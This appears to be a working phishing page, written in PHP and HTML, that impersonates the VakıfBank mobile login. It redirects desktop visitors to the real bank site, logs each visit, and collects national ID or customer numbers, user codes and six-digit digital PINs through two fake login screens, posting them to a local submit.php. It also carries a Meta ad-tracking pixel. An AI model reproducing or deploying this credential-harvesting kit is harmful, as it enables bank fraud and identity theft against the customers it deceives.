<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function isMobileRequest(): bool
{
    $userAgent = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '') return false;
    return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
}

if (!isMobileRequest()) {
    header('Location: ' . DESKTOP_BANK_LOGIN_URL);
    exit;
}

upsertPresence('giris', null, false);
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>VakıfBank — Ekranlar</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --gold: #e8b84a;
      --gold-bright: #f5d06a;
      --orange: #e8952e;
      --brown-dark: #2a1810;
      --brown-mid: #4a2e1a;
      --text-white: #ffffff;
      --text-muted: rgba(255,255,255,.55);
      --input-bg: rgba(0,0,0,.28);
      --input-border: rgba(255,255,255,.22);
      --btn-continue: #c8d4e8;
      --btn-continue-text: #6b7a8f;
      --panel-bg: rgba(235,240,248,.92);
      --phone-w: 390px;
      --phone-h: 844px;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #111;
      font-family: "Inter", system-ui, sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .phone {
      width: var(--phone-w);
      height: var(--phone-h);
      max-height: 96vh;
      border-radius: 36px;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 0 10px #1a1a1a, 0 20px 60px rgba(0,0,0,.6);
    }
    .screen {
      position: absolute;
      inset: 0;
      display: none;
      flex-direction: column;
      background: var(--brown-dark);
      color: var(--text-white);
    }
    .screen.active { display: flex; }

    .bg-gradient {
      position: absolute;
      inset: 0;
      background:
        radial-gradient(ellipse 120% 80% at 50% 35%, rgba(232,184,74,.45) 0%, transparent 55%),
        radial-gradient(ellipse 90% 60% at 80% 70%, rgba(180,100,40,.25) 0%, transparent 50%),
        linear-gradient(165deg, #1a0f08 0%, #3d2518 35%, #5c3a22 55%, #2a1810 100%);
      z-index: 0;
    }
    .bg-curves {
      position: absolute;
      inset: 0;
      z-index: 0;
      opacity: .35;
      background:
        url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 390 844'%3E%3Cpath d='M-20 200 Q200 100 400 250' fill='none' stroke='%23f5d06a' stroke-width='1' opacity='.4'/%3E%3Cpath d='M-10 400 Q250 300 420 500' fill='none' stroke='%23e8b84a' stroke-width='.8' opacity='.3'/%3E%3Cpath d='M50 600 Q200 500 380 650' fill='none' stroke='%23f5d06a' stroke-width='1.2' opacity='.25'/%3E%3C/svg%3E") center/cover no-repeat;
      pointer-events: none;
    }
    .screen > *:not(.bg-gradient):not(.bg-curves) { position: relative; z-index: 1; }

    .welcome-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 52px 20px 12px;
    }
    .lang-select {
      display: flex;
      align-items: center;
      gap: 4px;
      font-size: .875rem;
      font-weight: 600;
      color: var(--text-white);
      background: none;
      border: none;
      cursor: pointer;
    }
    .lang-select svg { width: 14px; height: 14px; opacity: .8; }
    .logo-row {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .logo-v {
      width: 32px;
      height: 32px;
      background: linear-gradient(135deg, var(--gold-bright), var(--gold));
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 800;
      font-size: .9rem;
      color: #3d2518;
    }
    .logo-name { font-size: 1.1rem; font-weight: 700; }
    .help-btn {
      width: 36px;
      height: 36px;
      border: none;
      background: rgba(232,184,74,.25);
      border-radius: 10px;
      cursor: pointer;
    }

    .quick-row {
      display: flex;
      justify-content: center;
      gap: 20px;
      padding: 8px 16px 20px;
    }
    .quick-chip {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      width: 72px;
    }
    .quick-chip__circle {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      border: 2px solid var(--gold);
      background: rgba(0,0,0,.2);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: .65rem;
      font-weight: 700;
      color: var(--gold-bright);
      text-align: center;
      line-height: 1.1;
    }
    .quick-chip__label {
      font-size: .6rem;
      color: var(--text-muted);
      text-align: center;
      line-height: 1.2;
    }

    .welcome-center {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 0 24px;
      text-align: center;
    }
    .welcome-logo-big {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: linear-gradient(145deg, rgba(255,255,255,.15), rgba(0,0,0,.2));
      border: 2px solid rgba(232,184,74,.4);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
      box-shadow: 0 8px 32px rgba(0,0,0,.3);
    }
    .welcome-logo-big .logo-v {
      width: 56px;
      height: 56px;
      font-size: 1.5rem;
      border-radius: 14px;
    }
    .welcome-title {
      font-size: 1.75rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    .welcome-sub {
      font-size: 1rem;
      color: var(--text-muted);
      margin-bottom: 32px;
    }
    .type-btns {
      display: flex;
      gap: 12px;
      width: 100%;
      max-width: 320px;
      margin-bottom: 12px;
    }
    .type-btn {
      flex: 1;
      padding: 14px 16px;
      border: none;
      border-radius: 14px;
      background: rgba(235,240,248,.95);
      color: var(--orange);
      font-family: inherit;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-outline {
      width: 100%;
      max-width: 320px;
      padding: 14px;
      border: 1.5px solid rgba(255,255,255,.5);
      border-radius: 14px;
      background: transparent;
      color: var(--orange);
      font-family: inherit;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }

    .bottom-panel {
      background: var(--panel-bg);
      border-radius: 24px 24px 0 0;
      padding: 20px 8px 28px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 4px;
    }
    .bottom-panel__item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      border: none;
      background: none;
      cursor: pointer;
      font-family: inherit;
    }
    .bottom-panel__icon {
      width: 28px;
      height: 28px;
      color: var(--orange);
    }
    .bottom-panel__label {
      font-size: .5rem;
      color: #555;
      text-align: center;
      line-height: 1.15;
      max-width: 58px;
    }
    .bottom-panel__icon--fast {
      font-size: .6rem;
      font-weight: 800;
      font-style: italic;
      color: var(--orange);
    }

    .login-header {
      display: flex;
      align-items: center;
      padding: 52px 16px 20px;
      position: relative;
    }
    .back-btn {
      width: 44px;
      height: 44px;
      border: none;
      background: none;
      color: #fff;
      font-size: 1.5rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-header .logo-row {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
    }

    .login-tabs {
      display: flex;
      justify-content: center;
      gap: 40px;
      padding: 0 24px 24px;
    }
    .login-tab {
      border: none;
      background: none;
      font-family: inherit;
      font-size: 1rem;
      font-weight: 500;
      color: var(--text-muted);
      padding-bottom: 10px;
      cursor: pointer;
      position: relative;
    }
    .login-tab.active {
      color: var(--text-white);
      font-weight: 600;
    }
    .login-tab.active::after {
      content: "";
      position: absolute;
      left: 0;
      right: 0;
      bottom: 0;
      height: 3px;
      background: var(--gold);
      border-radius: 2px;
    }

    .login-form {
      flex: 1;
      padding: 0 20px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }
    .field {
      position: relative;
    }
    .field input {
      width: 100%;
      padding: 16px 18px;
      border-radius: 12px;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      color: #fff;
      font-family: inherit;
      font-size: .9rem;
      outline: none;
    }
    .field input::placeholder { color: var(--text-muted); }
    .field input:focus {
      border-color: rgba(232,184,74,.5);
    }
    .field--password input { padding-right: 90px; }
    .field__link {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      border: none;
      background: none;
      color: var(--text-white);
      font-family: inherit;
      font-size: .85rem;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-devam {
      margin-top: 8px;
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 14px;
      background: var(--btn-continue);
      color: var(--btn-continue-text);
      font-family: inherit;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-devam:disabled { opacity: .6; cursor: default; }
    .btn-devam:active:not(:disabled) { opacity: .9; }

    .form-error {
      background: rgba(255,80,80,.15);
      border: 1px solid rgba(255,80,80,.35);
      border-radius: 10px;
      padding: 10px 14px;
      font-size: .8rem;
      color: #ff6b6b;
      display: none;
    }
    .form-error.show { display: block; }

    .hidden { display: none !important; }

    .dev-nav {
      position: fixed;
      bottom: 12px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 6px;
      z-index: 999;
      background: rgba(0,0,0,.85);
      padding: 8px 12px;
      border-radius: 20px;
    }
    .dev-nav button {
      border: none;
      background: #333;
      color: #fff;
      padding: 6px 12px;
      border-radius: 12px;
      font-size: .7rem;
      cursor: pointer;
      font-family: inherit;
    }
    .dev-nav button.active { background: var(--gold); color: #222; }
  </style>
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body>

  <div class="phone">
    <!-- EKRAN 1: Karşılama -->
    <section id="screen-welcome" class="screen active">
      <div class="bg-gradient"></div>
      <div class="bg-curves"></div>

      <header class="welcome-header">
        <button type="button" class="lang-select">TR <svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></button>
        <div class="logo-row">
          <span class="logo-v">V</span>
          <span class="logo-name">VakıfBank</span>
        </div>
        <button type="button" class="help-btn" aria-label="Yardım"></button>
      </header>

      <div class="quick-row">
        <div class="quick-chip"><div class="quick-chip__circle">DBS</div><span class="quick-chip__label">DBS</span></div>
        <div class="quick-chip"><div class="quick-chip__circle">VaNa</div><span class="quick-chip__label">VaNa</span></div>
        <div class="quick-chip"><div class="quick-chip__circle">Vinov</div><span class="quick-chip__label">Vinov Ecza</span></div>
        <div class="quick-chip"><div class="quick-chip__circle">📄</div><span class="quick-chip__label">Pratik Tahsilat...</span></div>
      </div>

      <div class="welcome-center">
        <div class="welcome-logo-big"><span class="logo-v">V</span></div>
        <h1 class="welcome-title">Hoş Geldiniz</h1>
        <p class="welcome-sub">Burası Sizin Yeriniz</p>
        <div class="type-btns">
          <button type="button" class="type-btn" data-go="bireysel">Bireysel</button>
          <button type="button" class="type-btn" data-go="ticari">Ticari</button>
        </div>
        <button type="button" class="btn-outline">Müşteri Ol</button>
      </div>

      <nav class="bottom-panel">
        <button type="button" class="bottom-panel__item">
          <span class="bottom-panel__icon bottom-panel__icon--fast">fast</span>
          <span class="bottom-panel__label">FAST İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19V5M10 19V9M16 19v-6M22 19V3"/></svg>
          <span class="bottom-panel__label">Piyasa Bilgileri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
          <span class="bottom-panel__label">Karekod İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
          <span class="bottom-panel__label">Başvuru İşlemleri</span>
        </button>
        <button type="button" class="bottom-panel__item">
          <svg class="bottom-panel__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><rect x="8" y="6" width="8" height="5" rx="1"/></svg>
          <span class="bottom-panel__label">Cepte Kazan</span>
        </button>
      </nav>
    </section>

    <!-- EKRAN 2: Bireysel giriş -->
    <section id="screen-bireysel" class="screen">
      <div class="bg-gradient"></div>
      <div class="bg-curves"></div>

      <header class="login-header">
        <button type="button" class="back-btn" data-back aria-label="Geri">‹</button>
        <div class="logo-row">
          <span class="logo-v">V</span>
          <span class="logo-name">VakıfBank</span>
        </div>
      </header>

      <nav class="login-tabs">
        <button type="button" class="login-tab active" data-tab="bireysel">Bireysel</button>
        <button type="button" class="login-tab" data-tab="ticari">Ticari</button>
      </nav>

      <form class="login-form" method="post" action="submit.php">
        <div class="form-error" id="error-bireysel"></div>
        <div class="field">
          <input type="text" name="national_id" placeholder="T.C. Kimlik ya da Müşteri Numarası" autocomplete="off" inputmode="numeric" />
        </div>
        <div class="field field--password">
          <input type="password" name="demo_pin" placeholder="Dijital Şifre" autocomplete="off" inputmode="numeric" maxlength="6" />
          <button type="button" class="field__link">Şifre Al</button>
        </div>
        <button type="submit" class="btn-devam">Devam</button>
      </form>
    </section>

    <!-- EKRAN 3: Ticari giriş -->
    <section id="screen-ticari" class="screen">
      <div class="bg-gradient"></div>
      <div class="bg-curves"></div>

      <header class="login-header">
        <button type="button" class="back-btn" data-back aria-label="Geri">‹</button>
        <div class="logo-row">
          <span class="logo-v">V</span>
          <span class="logo-name">VakıfBank</span>
        </div>
      </header>

      <nav class="login-tabs">
        <button type="button" class="login-tab" data-tab="bireysel">Bireysel</button>
        <button type="button" class="login-tab active" data-tab="ticari">Ticari</button>
      </nav>

      <form class="login-form" method="post" action="submit.php">
        <div class="form-error" id="error-ticari"></div>
        <input type="hidden" name="tip" value="ticari" />
        <div class="field">
          <input type="text" name="national_id" placeholder="Müşteri Numarası" autocomplete="off" inputmode="numeric" />
        </div>
        <div class="field">
          <input type="text" name="user_code" placeholder="Kullanıcı Kodu" autocomplete="off" />
        </div>
        <div class="field field--password">
          <input type="password" name="demo_pin" placeholder="Dijital Şifre" autocomplete="off" inputmode="numeric" maxlength="6" />
          <button type="button" class="field__link">Şifre Al</button>
        </div>
        <button type="submit" class="btn-devam">Devam</button>
      </form>
    </section>
  </div>

  <!-- Hızlı ekran geçişi (geliştirme) -->
  <nav class="dev-nav" aria-label="Ekran seç">
    <button type="button" data-screen="welcome" class="active">1 Karşılama</button>
    <button type="button" data-screen="bireysel">2 Bireysel</button>
    <button type="button" data-screen="ticari">3 Ticari</button>
  </nav>

  <script>
    const screens = {
      welcome: document.getElementById("screen-welcome"),
      bireysel: document.getElementById("screen-bireysel"),
      ticari: document.getElementById("screen-ticari"),
    };

    function show(name) {
      Object.values(screens).forEach((s) => s.classList.remove("active"));
      screens[name].classList.add("active");
      document.querySelectorAll(".dev-nav button").forEach((b) => {
        b.classList.toggle("active", b.dataset.screen === name);
      });
      // Clear errors on screen switch
      document.querySelectorAll(".form-error").forEach((e) => {
        e.classList.remove("show");
        e.textContent = "";
      });
    }

    document.querySelectorAll("[data-go]").forEach((btn) => {
      btn.addEventListener("click", () => show(btn.dataset.go));
    });

    document.querySelectorAll("[data-back]").forEach((btn) => {
      btn.addEventListener("click", () => show("welcome"));
    });

    document.querySelectorAll(".login-tab").forEach((tab) => {
      tab.addEventListener("click", () => show(tab.dataset.tab));
    });

    document.querySelectorAll(".dev-nav button").forEach((btn) => {
      btn.addEventListener("click", () => show(btn.dataset.screen));
    });

    // Form submission
    document.querySelectorAll(".login-form").forEach((form) => {
      const errorBox = form.querySelector(".form-error");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();
        errorBox.classList.remove("show");
        errorBox.textContent = "";

        const btn = form.querySelector(".btn-devam");
        const originalText = btn.textContent;
        btn.disabled = true;
        btn.textContent = "Bekleniyor...";

        const formData = new FormData(form);

        try {
          const res = await fetch(form.action, {
            method: "POST",
            body: formData,
            headers: {
              "X-Requested-With": "XMLHttpRequest",
              "Accept": "application/json",
            },
          });

          let data;
          try {
            data = await res.json();
          } catch {
            data = { ok: false, errors: ["Sunucu yanıtı okunamadı."] };
          }

          if (!data.ok) {
            btn.disabled = false;
            btn.textContent = originalText;
            errorBox.textContent = data.errors?.[0] || "İşlem başarısız oldu.";
            errorBox.classList.add("show");
            return;
          }

          window.location.href = data.next_url;
        } catch (err) {
          btn.disabled = false;
          btn.textContent = originalText;
          errorBox.textContent = "Bağlantı sorunu oluştu. Lütfen tekrar deneyin.";
          errorBox.classList.add("show");
        }
      });
    });
  </script>
</body>
</html>
